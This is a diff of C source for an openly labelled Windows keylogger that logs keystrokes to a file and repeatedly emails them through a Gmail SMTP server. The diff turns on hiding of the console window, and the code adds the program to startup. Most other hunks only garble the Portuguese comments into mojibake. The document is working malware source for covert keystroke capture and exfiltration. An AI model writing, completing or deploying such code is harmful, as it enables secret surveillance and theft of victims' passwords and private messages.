@@ -1,7 +1,7 @@
 /*
 
 	Keylogger that sends email after capturing some keys
-	Keylogger que envia por email após capturar determinada qtd de teclas
+	Keylogger que envia por email apÃ³s capturar determinada qtd de teclas
 
 */
 
@@ -44,7 +44,7 @@ int main(int argc, char** argv)
 {
 	//hiddens cmd	
 	//oculta prompt de comando
-	//ShowWindow (GetConsoleWindow(), SW_HIDE);
+	ShowWindow (GetConsoleWindow(), SW_HIDE);
 
 	//add keylogger to startup	
 	//tenta add o keylogger na startup (toda vez que for executado)
@@ -64,7 +64,7 @@ int main(int argc, char** argv)
 	FILE *file = fopen(LOG_PATH, "r+");
 
 	/*
-		verifica se há resquicios de log no arquivo antes de criar outro
+		verifica se hÃ¡ resquicios de log no arquivo antes de criar outro
 		util qnd o individuo desligou o pc durante a captura, ao reinicar o programa,
 		os logs nao serao perdidos
 	*/
@@ -87,14 +87,14 @@ int main(int argc, char** argv)
 		char *data = (char *)malloc(len);
 
 		//go to the file start
-		//vai pro inicio do arquivo e o lê inteiro
+		//vai pro inicio do arquivo e o lÃª inteiro
 		fseek(file, 0, SEEK_SET);
 		fread(data, sizeof(char), len, file);
 
 		printf("%s\n", data);
 
 		// loop for the successful email sending 
-		// loop so sai quando o email é enviado corretamente
+		// loop so sai quando o email Ã© enviado corretamente
 		while (success == 0)
 		{
 			sendEmail(GMAIL_SERVER, EMAIL_FROM, EMAIL_TO, data);
@@ -112,7 +112,7 @@ int main(int argc, char** argv)
 	}
 
 	//program's main loop
-	//loop principal da aplicação 
+	//loop principal da aplicaÃ§Ã£o 
 	while (1)
 	{
 		//opens a new log file
@@ -214,8 +214,8 @@ void getKeys(FILE *f)
 							{
 								printf("\n%d\t%c\n", c, c);
 
-								// symbols !@#$%¨&*()
-								// captura sinas de pontuação !@#$%¨&*()
+								// symbols !@#$%Â¨&*()
+								// captura sinas de pontuaÃ§Ã£o !@#$%Â¨&*()
 								if (c >= 48 && c <= 57)
 								{
 									pos = c % 48;
@@ -264,7 +264,7 @@ void getKeys(FILE *f)
 									case 190:
 										fprintf(f, ">");
 										break;
-										//Ç
+										//Ã‡
 									case 186:
 										fprintf(f, "C");
 										break;
@@ -295,8 +295,8 @@ void getKeys(FILE *f)
 							{
 								printf("\n%d\t%c\n", c, c);
 
-								//symbols !@#$%¨&*()
-								// captura sinas de pontuação !@#$%¨&*()
+								//symbols !@#$%Â¨&*()
+								// captura sinas de pontuaÃ§Ã£o !@#$%Â¨&*()
 								if (c >= 48 && c <= 57)
 								{
 									pos = c % 48;
@@ -345,7 +345,7 @@ void getKeys(FILE *f)
 									case 190:
 										fprintf(f, ">");
 										break;
-										//Ç
+										//Ã‡
 									case 186:
 										fprintf(f, "C");
 										break;
@@ -440,7 +440,7 @@ void getKeys(FILE *f)
 				case 105:
 					fprintf(f, "9");
 					break;
-					//ç
+					//Ã§
 				case 186:
 					fprintf(f, "c");
 					break;
@@ -475,7 +475,7 @@ void getKeys(FILE *f)
 					//pega todo o conteudo do arq e envia por email
 					char *data = (char *)malloc(len);
 
-					//vai pro inicio do arquivo e lê tudo
+					//vai pro inicio do arquivo e lÃª tudo
 					fseek(f, 0, SEEK_SET);
 					fread(data, sizeof(char), len, f);
 
@@ -484,7 +484,7 @@ void getKeys(FILE *f)
 					printf("%s\n", data);
 
 					// loop for the successful email sending
-					// loop so sai quando o email é enviado corretamente
+					// loop so sai quando o email Ã© enviado corretamente
 					while (success == 0)
 					{
 						sendEmail(GMAIL_SERVER, EMAIL_FROM, EMAIL_TO, data);
@@ -547,7 +547,7 @@ void sendEmail(char server[], char from[], char to[], char buffer[])
 	printf("%\nlen = %d\n", strlen(buffer));
 
 	//lenght of the email content
-	//tamanho do conteudo que será enviado por email
+	//tamanho do conteudo que serÃ¡ enviado por email
 	char data[strlen(buffer) + 200];
 
 	// Get socket and dest:
